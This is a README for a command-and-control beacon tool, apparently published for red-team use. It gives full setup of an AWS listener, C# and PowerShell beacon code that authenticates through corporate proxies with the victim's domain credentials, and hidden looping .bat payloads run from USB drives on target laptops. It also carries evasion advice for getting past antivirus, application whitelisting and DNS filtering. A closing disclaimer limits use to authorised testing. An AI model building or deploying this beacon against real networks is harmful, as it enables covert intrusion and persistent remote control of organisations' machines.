``` 
      ________                        
  ____ \_____  \  _____ __  _  ________
_/ ___\ /  ____/  \__  \\ \/ \/ /  ___/
\  \___/       \   / __ \\     /\___ \ 
 \___  >_______ \ (____  /\/\_//____  >
     \/        \/      \/           \/  

```

# C2_AWS — Proxy-Aware Beacon Client

A lightweight beacon client that communicates outbound from Windows machines behind VPNs and authenticated proxies to an AWS-hosted listener.

---

## Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Prerequisites](#prerequisites)
- [Step 1 — Set Up the AWS Listener](#step-1--set-up-the-aws-listener)
- [Step 2 — Build the Beacon Client](#step-2--build-the-beacon-client)
- [Step 3 — Deploy to USB](#step-3--deploy-to-usb)
- [Step 4 — Run on Target](#step-4--run-on-target)
- [Alternative: .bat Deployment](#alternative-bat-deployment)
- [Troubleshooting](#troubleshooting)
- [Project Structure](#project-structure)
- [Legal Disclaimer](#legal-disclaimer)

---

## Overview

Corporate environments typically route all traffic through an authenticated proxy behind a VPN. Direct inbound connections from the internet are blocked. This tool solves that problem by initiating **outbound** HTTP/HTTPS connections from the internal machine to an AWS server, automatically inheriting the system's proxy configuration and the logged-in user's domain credentials.

The target user simply double-clicks a file from a USB drive — no installation, no admin privileges required.

## How It Works

```
┌──────────────────────┐         ┌───────────────┐         ┌──────────────┐
│   Windows 11 Client  │────────►│ Corporate VPN │────────►│  AWS Server  │
│   (USB Program)      │  HTTPS  │ + Auth Proxy  │  HTTPS  │  (Listener)  │
│                      │◄────────│               │◄────────│              │
└──────────────────────┘         └───────────────┘         └──────────────┘
```

1. The client detects the system's default web proxy automatically
2. It authenticates to the corporate proxy using the logged-in user's domain credentials (NTLM/Kerberos)
3. It sends an outbound HTTP/HTTPS request to the AWS listener
4. The AWS server responds with data, commands, or acknowledgment
5. The client waits for a configured interval, then repeats (beacon loop)

To the corporate firewall and proxy, this looks identical to a user browsing a website.

---

## Prerequisites

### Your Machine (Build/Attack Box)
- Windows 10 or 11
- Visual Studio 2022 (Community edition is fine)
- .NET Framework 4.8 targeting pack (install via Visual Studio Installer → Individual Components if missing)
- Git

### AWS Infrastructure
- An AWS account
- An EC2 instance with a public IP address
- SSH access to the EC2 instance

### Target Machine (Corporate Laptop)
- Windows 11 (ships with .NET Framework 4.8 pre-installed)
- Connected to corporate VPN
- Outbound HTTP/HTTPS allowed through the corporate proxy (almost always the case — users need to browse the web)

---

## Step 1 — Set Up the AWS Listener

This is the server that receives beacon check-ins from the client.

### 1.1 — Launch an EC2 Instance

1. Log in to the AWS Console → EC2 → **Launch Instance**
2. Choose **Amazon Linux 2023** or **Ubuntu 22.04**
3. Instance type: `t2.micro` (free tier is fine)
4. Create or select a key pair for SSH
5. In **Network Settings**, create a security group with these inbound rules:

| Type  | Port | Source    | Purpose                    |
|-------|------|-----------|----------------------------|
| SSH   | 22   | Your IP   | Admin access               |
| HTTP  | 80   | 0.0.0.0/0 | Beacon check-ins           |
| HTTPS | 443  | 0.0.0.0/0 | Beacon check-ins (if TLS)  |

6. Launch the instance and note the **public IP address**

### 1.2 — Install a Simple Web Server

SSH into your instance and set up a basic listener. Here's a quick Python example:

```bash
ssh -i your-key.pem ec2-user@YOUR_AWS_IP
```

Install Python and create a simple listener:

```bash
sudo yum install python3 -y   # Amazon Linux
# or: sudo apt install python3 -y   # Ubuntu
```

Create `listener.py`:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[{datetime.now()}] Beacon received from {self.client_address[0]}")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        # This is what gets sent back to the client
        self.wfile.write(b"checked in")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        print(f"[{datetime.now()}] Data from {self.client_address[0]}: {body.decode()}")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"received")

print("Listener running on port 80...")
HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
```

Run it:

```bash
sudo python3 listener.py
```

You should see `Listener running on port 80...` — the server is now waiting for beacons.

### 1.3 — Verify the Listener

From your personal machine, open a browser and go to `http://YOUR_AWS_IP`. You should see the text `checked in` and the server terminal should log the connection.

### 1.4 — (Recommended) Add a Domain and TLS

Using a raw IP address over HTTP works, but HTTPS with a real domain looks more legitimate:

1. Point a domain (or subdomain) at your EC2 public IP via an A record
2. Install Certbot for a free Let's Encrypt certificate:
   ```bash
   sudo yum install certbot -y
   sudo certbot certonly --standalone -d yourdomain.com
   ```
3. Update your listener to serve HTTPS on port 443

---

## Step 2 — Build the Beacon Client

### 2.1 — Clone the Repo

On your personal machine:

```bash
git clone https://github.com/yourusername/c2_aws.git
cd c2_aws
```

### 2.2 — Open in Visual Studio

1. Open Visual Studio 2022
2. **File → Open → Project/Solution** → select `c2_aws.sln`

### 2.3 — Review the Code

Open `Program.cs`. The core beacon logic:

```csharp
using System.Management.Automation;

class Program
{
    static void Main()
    {
        using (var ps = PowerShell.Create())
        {
            ps.AddScript(@"
                $req = [System.Net.WebRequest]::Create('http://YOUR_AWS_IP')
                $req.Proxy = [System.Net.WebRequest]::DefaultWebProxy
                $req.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
                $res = $req.GetResponse()
                $reader = New-Object IO.StreamReader($res.GetResponseStream())
                $reader.ReadToEnd()
            ");
            ps.Invoke();
        }
    }
}
```

**Important:** Replace `YOUR_AWS_IP` with your actual EC2 public IP or domain name.

### 2.4 — Add the Required Reference

The project needs `System.Management.Automation` to host PowerShell:

**Option A — NuGet (easiest):**
1. Go to **Tools → NuGet Package Manager → Package Manager Console**
2. Run: `Install-Package System.Management.Automation`

**Option B — Manual reference:**
1. Right-click **References** in Solution Explorer → **Add Reference**
2. Search for `System.Management.Automation` → check it → OK

### 2.5 — Build

1. Set the configuration to **Release** (dropdown in the toolbar — change from Debug to Release)
2. **Build → Build Solution** (Ctrl+Shift+B)
3. If the build succeeds, your `.exe` is at:
   ```
   c2_aws\bin\Release\c2_aws.exe
   ```

### 2.6 — Test Locally

Before deploying, run the `.exe` on your personal machine and check your AWS listener terminal — you should see a beacon check-in logged.

---

## Step 3 — Deploy to USB

### Option A — Direct Copy

1. Navigate to `bin\Release\`
2. Copy `c2_aws.exe` (and any `.dll` files in the same folder) to your USB drive
3. That's it — the USB is ready

### Option B — Via GitHub (if .exe is blocked on corp network)

1. Push the compiled `.exe` as a GitHub Release:
   - Go to your repo → **Releases** → **Create a new release**
   - Tag it (e.g., `v1.0`)
   - Drag and drop `c2_aws.exe` as a release asset
   - Publish
2. On the corporate laptop, download the release from GitHub
3. Copy to USB drives

---

## Step 4 — Run on Target

1. Insert the USB drive into the target Windows 11 laptop
2. Open the USB in File Explorer
3. Double-click `c2_aws.exe` (or `beacon.bat` if using the batch method)
4. The beacon runs — no window appears, no installation happens
5. Check your AWS listener terminal — you should see the check-in

That's it. The client is now beaconing through the corporate VPN and proxy to your AWS server.

---

## Alternative: .bat Deployment

If the corporate machine blocks unknown `.exe` files (application whitelisting, AV, etc.), use a `.bat` file instead. Windows runs batch files natively.

### Single Beacon (one check-in)

Save as `beacon.bat`:

```bat
@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$req = [System.Net.WebRequest]::Create('http://YOUR_AWS_IP'); $req.Proxy = [System.Net.WebRequest]::DefaultWebProxy; $req.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; $res = $req.GetResponse(); $reader = New-Object IO.StreamReader($res.GetResponseStream()); $reader.ReadToEnd()"
```

### Looping Beacon (continuous, every 30 seconds)

Save as `beacon.bat`:

```bat
@echo off
:loop
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$req = [System.Net.WebRequest]::Create('http://YOUR_AWS_IP'); $req.Proxy = [System.Net.WebRequest]::DefaultWebProxy; $req.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; $res = $req.GetResponse(); $reader = New-Object IO.StreamReader($res.GetResponseStream()); $reader.ReadToEnd()"
timeout /t 30 /nobreak >nul
goto loop
```

### Key Flags

| Flag | Purpose |
|------|---------|
| `-WindowStyle Hidden` | No PowerShell window pops up |
| `-ExecutionPolicy Bypass` | Skips script execution restrictions |
| `-Command` | Runs code inline — no `.ps1` file on disk |

**Replace `YOUR_AWS_IP` with your EC2 public IP or domain.**

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| Beacon doesn't reach AWS | Corporate proxy blocking | Verify outbound HTTP/HTTPS works from a browser on the target machine first |
| `.exe` blocked on target | Application whitelisting / AV | Use the `.bat` deployment method instead |
| `.bat` runs but no check-in | PowerShell constrained language mode | Try `.vbs` or `.hta` alternatives (see below) |
| Proxy auth fails | Non-default proxy config | Confirm the machine uses the system proxy; check with `netsh winhttp show proxy` |
| Connection refused on AWS | Security group misconfigured | Ensure port 80/443 inbound is open to `0.0.0.0/0` in the EC2 security group |
| TLS/SSL errors | SSL-inspecting proxy | Don't pin certificates — use the system certificate store |
| DNS resolution fails | DNS filtering on unknown domains | Use an aged/categorized domain, or test with the raw IP first |

### Fallback Delivery Methods

If both `.exe` and `.bat` are blocked:

- **`.vbs` (VBScript)** — uses `MSXML2.XMLHTTP` to make HTTP requests; runs natively on Windows
- **`.hta` (HTML Application)** — runs via `mshta.exe`, a signed Microsoft binary
- **`.lnk` (Shortcut)** — create a Windows shortcut with the PowerShell command as the target; looks like a normal icon

---

## Project Structure

```
c2_aws/
├── Properties/
│   └── AssemblyInfo.cs        # Assembly metadata
├── App.config                 # .NET application config
├── Program.cs                 # Main beacon logic
├── c2_aws.csproj              # .NET Framework 4.8 project file
├── c2_aws.sln                 # Visual Studio solution file
├── .gitignore                 # Excludes bin/, obj/, .vs/
├── .gitattributes             # Git line-ending config
└── README.md                  # This file
```

---

## Legal Disclaimer

**This tool is intended for use in authorized penetration testing and red team engagements only.**

Unauthorized use of this tool against systems you do not own or have explicit written permission to test is illegal and unethical. Always ensure you have a signed Rules of Engagement (ROE) or Statement of Work (SOW) before conducting any security assessment.

The author assumes no liability for misuse of this tool.

---

## License

For authorized security testing use only.